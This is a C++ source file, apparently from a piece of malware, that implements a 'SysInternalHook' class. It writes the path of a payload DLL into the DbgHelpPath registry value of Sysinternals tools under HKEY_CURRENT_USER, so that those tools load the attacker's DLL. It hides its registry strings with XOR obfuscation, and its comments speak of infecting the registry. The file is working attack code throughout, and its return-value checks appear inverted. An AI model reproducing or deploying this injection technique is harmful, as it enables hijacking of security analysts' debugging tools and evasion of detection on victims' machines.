#include "stdafx.h"
#include <Windows.h>
#include <Shlwapi.h>
#include "Debug.h"
#include "SysInternalHook.h"
#include "StringEncrypt.h"


// Write dll path to SysInternal DbgHelp Key
bool SysInternalHook::WriteHook(std::wstring toolName)
{
	//Ensure payload/hook exists
	if (!this->PayloadExists())
		return false;

	HKEY KEY_CU;
	XorS(SOFTWARE_SYSINTERNAL, "\\SOFTWARE\\SysInternals\\");
	XorS(DBG_HELP_PATH, "DbgHelpPath");

	//open sysinternal tool's regkey for write access
	std::wstring targetKey = SOFTWARE_SYSINTERNAL.decrypt() + toolName;

	if (!RegOpenKeyEx(HKEY_CURRENT_USER, targetKey.c_str(), 0, KEY_SET_VALUE, &KEY_CU)) {
#ifdef DEBUG
		DebugOut(std::wstring(L"Unable to open RegKey - ") + targetKey);
#endif
		return false;
	}
	//Infect Sysinternals Registry
	for (int Index = 0; ; Index++)
	{
		wchar_t sKey[MAX_PATH];
		DWORD cName = MAX_PATH;
		LONG res = RegEnumKeyEx(KEY_CU, Index, sKey, &cName,NULL, NULL, NULL, NULL);
		//write payload path to sysinternal dbghelp key
		if (!RegSetValue(KEY_CU, DBG_HELP_PATH.decrypt().c_str(), REG_SZ, this->injectPayload.c_str(), NULL)) {
#ifdef DEBUG
			DebugOut(std::wstring(L"Unable to set regKey - ") + targetKey + DBG_HELP_PATH.decrypt());
#endif
			return false;
		}
		if (res != ERROR_SUCCESS)
			return true;
		
	}
}

bool SysInternalHook::PayloadExists()
{
	if (!PathFileExists(injectPayload.c_str())) {
#ifdef DEBUG
		DebugOut(std::wstring(L"payload path does not exist - ") + injectPayload);
#endif
		return false;
	}
	return true;
}

//pass blackhole path here
SysInternalHook::SysInternalHook(std::wstring path)
{
	this->injectPayload = path;
}


SysInternalHook::~SysInternalHook()
{
}
